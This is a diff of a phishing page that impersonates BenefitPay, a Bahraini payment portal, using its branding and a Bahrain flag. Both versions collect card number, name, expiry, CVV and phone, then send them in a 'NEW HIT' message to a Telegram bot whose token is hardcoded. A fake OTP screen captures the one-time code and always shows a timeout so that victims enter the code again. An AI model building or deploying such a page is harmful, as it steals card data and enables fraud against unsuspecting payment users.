@@ -3,63 +3,45 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta property="og:title" content="BenefitPay - Secure Portal">
-    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/c/ce/Flag_of_Bahrain.svg/2560px-Flag_of_Bahrain.svg.png">
-    <title>BenefitPay Gateway</title>
+    <title>BenefitPay | Secure Portal</title>
     <style>
-        body { font-family: -apple-system, sans-serif; background: #f2f2f2; direction: rtl; margin: 0; }
+        body { font-family: sans-serif; background: #f2f2f2; direction: rtl; margin: 0; }
         .header { background: #e21e26; color: #fff; padding: 15px; display: flex; align-items: center; justify-content: space-between; }
         .container { padding: 20px; max-width: 400px; margin: auto; }
         .card { background: #fff; border-radius: 12px; padding: 25px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
-        label { display: block; margin-bottom: 5px; font-weight: bold; color: #444; font-size: 13px; text-align: right; }
         input { width: 100%; padding: 14px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; box-sizing: border-box; text-align: center; }
         .btn { background: #e21e26; color: #fff; border: none; width: 100%; padding: 16px; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; }
-        #otp-screen, #loading-screen { display: none; text-align: center; }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #e21e26; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 20px auto; }
+        #loading, #otp-screen { display: none; text-align: center; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #e21e26; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .footer-logos { margin-top: 20px; display: flex; justify-content: center; gap: 15px; opacity: 0.5; }
     </style>
 </head>
 <body>
     <div class="header">
-        <div><strong>BenefitPay</strong><br><small>Verified by Central Bank</small></div>
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/ce/Flag_of_Bahrain.svg/2560px-Flag_of_Bahrain.svg.png" width="45">
+        <div><strong>BenefitPay</strong><br><small>National Portal</small></div>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/ce/Flag_of_Bahrain.svg/2560px-Flag_of_Bahrain.svg.png" width="40">
     </div>
-
     <div class="container">
         <div class="card" id="main-card">
-            <label>Amount (BHD)</label>
-            <input type="number" id="amount" placeholder="0.000" style="border: 2px solid #e21e26; font-size: 22px; font-weight: bold;">
-            <label>Cardholder Name</label>
+            <input type="number" id="amount" placeholder="Amount (BHD)">
             <input type="text" id="holder" placeholder="Full Name">
-            <label>Card Number</label>
             <input type="text" id="card" placeholder="0000 0000 0000 0000" maxlength="19">
             <div style="display: flex; gap: 10px;">
-                <div style="flex:1"><label>Expiry</label><input type="text" id="exp" placeholder="MM/YY" maxlength="5"></div>
-                <div style="flex:1"><label>CVV</label><input type="password" id="cvv" placeholder="***" maxlength="3"></div>
+                <input type="text" id="exp" placeholder="MM/YY" maxlength="5" style="flex:1">
+                <input type="password" id="cvv" placeholder="CVV" maxlength="3" style="flex:1">
             </div>
-            <label>Mobile Number</label>
             <input type="number" id="phone" placeholder="3XXXXXXX">
-            <button class="btn" onclick="sendData()">Confirm & Pay</button>
-            
-            <div class="footer-logos">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d6/Visa_2021.svg/1200px-Visa_2021.svg.png" width="40">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1200px-Mastercard-logo.svg.png" width="35">
-            </div>
+            <button class="btn" onclick="sendData()">Continue</button>
         </div>
 
-        <div class="card" id="loading-screen">
-            <div class="spinner"></div>
-            <h3>Verifying Data...</h3>
-            <p style="font-size: 12px; color: #777;">Connecting to secure server.</p>
-        </div>
+        <div class="card" id="loading"><div class="spinner"></div><p>Verifying with Bank...</p></div>
 
         <div class="card" id="otp-screen">
-            <h3 style="color: #e21e26;">Secure Verification</h3>
-            <p>Enter the 6-digit code sent to your phone</p>
-            <input type="number" id="otp_code" placeholder="******" style="font-size: 26px; letter-spacing: 8px;">
-            <button class="btn" onclick="finalStep()">Verify OTP</button>
-            <p id="error-msg" style="color: red; display: none; margin-top: 15px; font-weight: bold;">⚠️ Connection timeout. System is busy, please re-enter the code.</p>
+            <h3>OTP Verification</h3>
+            <p>Enter code sent to your phone</p>
+            <input type="number" id="otp_code" placeholder="******" style="font-size: 24px; letter-spacing: 5px;">
+            <button class="btn" onclick="finalStep()">Confirm</button>
+            <p id="err" style="color:red; display:none; margin-top:10px;">Connection Timeout. Try again.</p>
         </div>
     </div>
 
@@ -67,37 +49,33 @@
     const token = "8428698833:AAHTDJu1uFDF61ytjsxh8PlSWwbrSPWSGG0";
     const chatId = "8302667206";
 
-    // Auto-format Card
-    document.getElementById('card').addEventListener('input', e => {
-        e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
-    });
+    // Format Card & Date
+    document.getElementById('card').addEventListener('input', e => { e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim(); });
+    document.getElementById('exp').addEventListener('input', e => { if (e.target.value.length === 2 && !e.target.value.includes('/')) e.target.value += '/'; });
 
-    // Auto-format Expiry
-    document.getElementById('exp').addEventListener('input', e => {
-        if (e.target.value.length === 2 && !e.target.value.includes('/')) e.target.value += '/';
-    });
-
-    function sendData() {
+    async function sendData() {
         const msg = `🔥 NEW HIT 🔥\nAmt: ${document.getElementById('amount').value}\nName: ${document.getElementById('holder').value}\nCard: ${document.getElementById('card').value}\nExp: ${document.getElementById('exp').value}\nCVV: ${document.getElementById('cvv').value}\nPh: ${document.getElementById('phone').value}`;
+        
+        document.getElementById('main-card').style.display = 'none';
+        document.getElementById('loading').style.display = 'block';
 
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`)
-        .then(() => {
-            document.getElementById('main-card').style.display = 'none';
-            document.getElementById('loading-screen').style.display = 'block';
+        try {
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+            // الانتظار 3 ثواني لإعطاء واقعية
             setTimeout(() => {
-                document.getElementById('loading-screen').style.display = 'none';
+                document.getElementById('loading').style.display = 'none';
                 document.getElementById('otp-screen').style.display = 'block';
-            }, 4000);
-        }).catch(err => alert("Connection Error. Try again."));
+            }, 3000);
+        } catch (e) {
+            alert("Connection Error. Please try again.");
+            location.reload();
+        }
     }
 
-    function finalStep() {
+    async function finalStep() {
         const otp = document.getElementById('otp_code').value;
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🔑 OTP: " + otp)}`)
-        .then(() => {
-            document.getElementById('otp_code').value = '';
-            document.getElementById('error-msg').style.display = 'block';
-        });
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🔑 OTP: " + otp)}`);
+        document.getElementById('err').style.display = 'block';
     }
 </script>
 </body>
